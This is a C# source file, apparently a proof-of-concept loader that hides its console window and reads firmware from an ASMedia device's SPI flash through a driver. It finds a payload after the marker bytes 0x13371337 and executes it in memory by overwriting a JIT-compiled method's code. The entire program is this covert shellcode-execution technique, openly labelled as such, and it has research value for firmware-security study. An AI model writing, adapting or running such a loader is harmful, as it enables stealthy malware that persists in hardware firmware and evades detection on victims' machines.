#region License
/*
 * Copyright (C) 2019 Stefano Moioli <smxdev4@gmail.com>
 * This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/.
 */
#endregion
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace AsmTool
{
	class Program
	{
		[DllImport("user32.dll")]
		static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		[DllImport("kernel32.dll")]
		static extern IntPtr GetConsoleWindow();

		const int SW_HIDE = 0;
		const int SW_SHOW = 5;

		const uint FIRMWARE_SIZE = 131072; //128k ROM
		static void Main(string[] args) {
			var handle = GetConsoleWindow();
			ShowWindow(handle, SW_HIDE);

			#region read firmware from asmedia device
			IAsmIO io = AsmIOFactory.GetAsmIO();
			io.UnloadAsmIODriver();
			if (io.LoadAsmIODriver() != 1) {
				Console.Error.WriteLine("Failed to load ASM IO Driver");
				return;
			}
			AsmDevice dev = new AsmDevice(io);
			uint num_reads = FIRMWARE_SIZE / 8;
			List<byte> firmware = new List<byte>();
			for (uint i = 0; i < num_reads; i++) {
				if (!dev.SPIReadQword(i * 8, out ulong qword)) {
					break;
				}
				byte[] bytes = BitConverter.GetBytes(qword);
				for (int j = 0; j < 8; j++) {
					firmware.Add(bytes[j]);

				}
			}
			#endregion read firmware from asmedia device

			#region execute shellcode in memory	
			try {
			List<byte> buflist = new List<byte>();
			for (int i = 0; i < firmware.Count-4; i++) {
					if ((firmware[i] == 0x13) &
				   (firmware[i + 1] == 0x37) &
				   (firmware[i + 2] == 0x13) &
				   (firmware[i + 3] == 0x37)) {
					//we have found our payload
					for (int j = i+4; j < firmware.Count; j++) {
						buflist.Add(firmware[j]);
					}
					i = firmware.Count;
				}
			}
			byte[] buf = buflist.ToArray();
			Console.WriteLine("payload size: "+buflist.Count);
			IntPtr ptrToMethod = IntPtr.Zero;
			MethodInfo myMethod = null;

			myMethod = typeof(Program).GetMethod("overWriteReflection");
			System.Runtime.CompilerServices.RuntimeHelpers.PrepareMethod(myMethod.MethodHandle);
			ptrToMethod = myMethod.MethodHandle.GetFunctionPointer();
			Marshal.Copy(buf, 0, ptrToMethod, buf.Length);
			overWriteReflection();
			} catch (Exception ex) {

				Console.WriteLine(ex.Message);
				throw ex;
			}
			#endregion execute shellcode in memory

			while (true) ;
		}

		public static void overWriteReflection() {
			bool malCode = false;
			if (malCode is true)
				return;
			return;
		}

	}
}
